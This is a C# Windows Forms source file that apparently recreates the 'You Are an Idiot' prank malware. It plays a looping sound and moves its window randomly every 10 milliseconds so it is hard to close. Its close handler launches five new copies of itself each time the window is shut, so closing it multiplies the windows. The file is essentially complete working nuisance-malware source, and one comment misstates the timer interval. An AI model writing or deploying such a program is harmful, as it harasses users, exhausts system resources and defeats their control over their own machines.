using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using static System.Net.WebRequestMethods;
using System.Windows;
using System.Diagnostics;


namespace youareanidiot
{
    public partial class Form1 : Form
    {
        private Timer moveTimer;
        private Random random;
        private int moveDistance = 50; // 移動距離

        public Form1()
        {
            InitializeComponent();
            InitializeForm();
            InitializeRandomMover();
            System.IO.Stream strm = Properties.Resources.you;
            //同期再生する
            System.Media.SoundPlayer player = new System.Media.SoundPlayer(strm);
            player.PlayLooping();
        }

        private void InitializeForm()
        {


        }

        private void InitializeRandomMover()
        {
            random = new Random();
            moveTimer = new Timer();
            moveTimer.Interval = 10; // 0.5秒ごとに移動
            moveTimer.Tick += new EventHandler(MoveWindowRandomly);
            moveTimer.Start();
        }

        private void MoveWindowRandomly(object sender, EventArgs e)
        {
            // 現在のウィンドウの位置
            int currentX = this.Location.X;
            int currentY = this.Location.Y;

            // ランダムな方向を決定
            int direction = random.Next(0, 8); // 0から7の値を生成
            int newX = currentX;
            int newY = currentY;

            switch (direction)
            {
                case 0: // 上
                    newY -= moveDistance;
                    break;
                case 1: // 右上
                    newX += moveDistance;
                    newY -= moveDistance;
                    break;
                case 2: // 右
                    newX += moveDistance;
                    break;
                case 3: // 右下
                    newX += moveDistance;
                    newY += moveDistance;
                    break;
                case 4: // 下
                    newY += moveDistance;
                    break;
                case 5: // 左下
                    newX -= moveDistance;
                    newY += moveDistance;
                    break;
                case 6: // 左
                    newX -= moveDistance;
                    break;
                case 7: // 左上
                    newX -= moveDistance;
                    newY -= moveDistance;
                    break;
            }

            // 画面の作業領域の範囲を取得
            Rectangle workingArea = Screen.PrimaryScreen.WorkingArea;

            // 新しい位置が作業領域内に収まるように調整
            if (newX < workingArea.Left)
                newX = workingArea.Left;
            if (newX + this.Width > workingArea.Right)
                newX = workingArea.Right - this.Width;
            if (newY < workingArea.Top)
                newY = workingArea.Top;
            if (newY + this.Height > workingArea.Bottom)
                newY = workingArea.Bottom - this.Height;

            // ウィンドウの位置を設定
            this.Location = new Point(newX, newY);
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
            Process.Start("youareanidiot.exe");
            Process.Start("youareanidiot.exe");
            Process.Start("youareanidiot.exe");
            Process.Start("youareanidiot.exe");
            Process.Start("youareanidiot.exe");
        }
    }
}
